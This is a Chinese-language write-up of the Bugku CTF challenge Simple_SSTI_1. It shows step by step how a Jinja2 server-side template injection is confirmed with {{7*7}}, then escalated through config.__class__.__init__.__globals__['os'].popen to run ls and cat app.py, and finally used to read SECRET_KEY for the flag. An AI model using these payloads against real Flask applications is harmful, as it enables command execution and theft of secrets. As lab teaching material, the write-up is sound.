---
title: Bugku CTF Simple_SSTI_1
date: 2026-09-17
categories: Bugku,Web
tags: Bugku Web SSTI Jinja2 Flask模板注入
---

# 题目：Simple_SSTI_1

## 题目描述
访问靶机首页，页面提示 `You need pass in a parameter named flag.`。
后端接收GET参数`flag`，将参数值直接交给Jinja2模板引擎渲染，存在SSTI服务端模板注入漏洞，目标获取flag。

## 解题思路
1. 先满足服务器要求：传入GET参数flag，绕过初始提示。
2. 测试是否存在SSTI漏洞，验证Jinja2模板是否会执行表达式。
3. 通过系统命令查看当前目录文件，寻找flag位置。
4. 读取网站源码app.py，分析代码逻辑，找到flag存放位置。
5. 构造payload读取Flask配置项，直接拿到环境变量内的flag。

## 解题步骤
1. 访问靶机地址：`http://160.202.254.160:17164`，页面提示需要传入名为flag的参数。
2. 在地址栏加上GET参数访问：`http://160.202.254.160:17164/?flag=123`，页面输出123，参数传入成功。
3. 漏洞验证：`http://160.202.254.160:17164/?flag={{7*7}}`，页面返回49，证明Jinja2会执行模板表达式，SSTI漏洞存在。
4. 执行ls查看目录：`http://160.202.254.160:17164/?flag={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
   得到文件列表：Dockerfile app.py templates，当前目录没有flag文件。
5. 读取后端源码app.py：
`http://160.202.254.160:17164/?flag={{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}`
   阅读源码发现flag存储在系统环境变量`$FLAG`，并且赋值给Flask的`SECRET_KEY`。
6. 最终Payload读取flag：
`http://160.202.254.160:17164/?flag={{config.SECRET_KEY}}`
页面输出flag：`flag{e92af3295d904742dcefd882f6bf488b}`

## 踩坑指南
1. 错误操作：把网址粘贴进谷歌搜索框搜索，不是浏览器地址栏访问网页。搜索框无法打开靶机，必须使用顶部地址栏。
2. 直接使用`__mro__[2]`这类payload：不同Python版本，类继承下标不一样，容易报`tuple object has no element 2`下标错误，新手优先用`config`系列payload。
3. 上来直接cat flag：flag不一定在当前目录文件，这题flag不存在文件，而是放在系统环境变量，直接cat会空白无返回。
4. 参数名写错：必须是`?flag=xxx`，参数名固定为flag，写`?test=xxx`会直接返回提示，无法进入模板渲染。

## 知识点总结
1. **SSTI服务端模板注入**：用户可控输入，直接送入后端模板引擎(Jinja2)解析渲染，导致模板表达式执行。
2. Flask/Jinja2内置`config`全局对象，可以直接读取`SECRET_KEY`等配置信息，是SSTI最常用的Payload。
3. CTF靶机flag存放位置不固定：可以在文件内，也可以放在操作系统环境变量中。
4. GET传参规则：URL中`?`用来分隔网址和参数，格式 `url?参数名=参数值`。
5. 漏洞验证方法：`{{7*7}}`，如果页面输出49而不是原样文本，代表模板成功执行表达式，SSTI成立。
